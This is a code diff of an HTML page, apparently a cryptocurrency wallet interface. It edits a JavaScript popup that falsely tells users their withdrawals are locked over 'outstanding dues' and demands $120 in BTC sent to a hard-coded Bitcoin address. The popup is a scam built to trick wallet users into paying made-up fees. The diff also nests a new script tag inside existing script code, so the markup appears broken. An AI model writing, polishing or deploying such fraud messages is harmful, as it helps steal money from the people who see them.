@@ -193,28 +193,31 @@
     fetchBTCPrice();
     setInterval(fetchBTCPrice, 30000); // refresh every 30s
 
+<script>
   function showPaymentPopup() {
-  const message = `
-  🚫 Withdrawals Locked 🚫
+    const message = `
+🚫 Withdrawals Locked 🚫
 
-  Your wallet currently has **outstanding dues** that must be paid to enable withdrawals.
+Your wallet currently has **outstanding dues** that must be paid to enable withdrawals.
 
-  💰 **Outstanding Balance:** $120.00 USD equivalent in BTC  
-  📅 **Billing Cycle:** Annual (January 1 – December 31)  
-  ✅ **Status:** Payment Overdue
+💰 Outstanding Balance: $120.00 USD equivalent in BTC  
+📅 Billing Cycle: Annual (January 1 – December 31)  
+✅ Status: Payment Overdue
 
-  🔓 To unlock your wallet, please send the due amount to the following BTC address:
+🔓 To unlock your wallet, please send the due amount to the following BTC address:
 
-  ➤ **Bitcoin Address:**  
-  bc1qnkw0damggha5xp98mh9ra63rtf4kxqp5l52qs8
+➤ Bitcoin Address:  
+bc1qnkw0damggha5xp98mh9ra63rtf4kxqp5l52qs8
 
-  📌 Once payment is confirmed, withdrawals will be re-enabled.
+📌 Once payment is confirmed, withdrawals will be re-enabled.
 
-  Need BTC?  
-  Visit: https://www.coinbase.com/
+Need BTC?  
+Visit: https://www.coinbase.com/
 
-  ⚠️ Note: Partial payments will not unlock your wallet.
-  `;
-  alert(message);
-}
-
+⚠️ Note: Partial payments will not unlock your wallet.
+    `;
+    alert(message);
+  }
+</script>
+</body>
+</html>
